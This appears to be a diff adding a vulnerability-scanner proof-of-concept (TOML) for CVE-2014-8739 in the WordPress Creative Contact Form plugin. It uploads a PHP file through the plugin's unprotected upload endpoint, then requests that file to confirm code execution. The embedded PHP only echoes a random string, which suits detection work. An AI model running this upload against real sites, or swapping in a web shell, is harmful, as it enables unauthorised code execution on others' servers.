@@ -1,0 +1,52 @@
+[info]
+author = "ave"
+description = "通过 POST 请求向 /wp-content/plugins/sexy-contact-form/includes/fileupload/index.php 上传包含 PHP 代码的恶意文件，然后 GET 访问上传的文件验证 PHP 代码执行，确认存在无限制文件上传漏洞。"
+id = "POC-AVE-2014-0040"
+name = "Creative Solutions Creative Contact Form 任意文件上传 PoC"
+severity = "critical"
+tags = ["ave-2014-0040"]
+vuln_id = [
+    "CVE-2014-8739",
+    "AVE-2014-0040",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+------WebKitFormBoundary7MA4YWxkTrZu0gW\r
+Content-Disposition: form-data; name="files[]"; filename="{{rand_base(6)}}.php"\r
+Content-Type: application/octet-stream\r
+\r
+<?php echo "{{randstr}}"; ?>\r
+------WebKitFormBoundary7MA4YWxkTrZu0gW--"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "files",
+    "delete_url",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/wp-content/plugins/sexy-contact-form/includes/fileupload/files/{{rand_base(6)}}.php"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["{{randstr}}"]
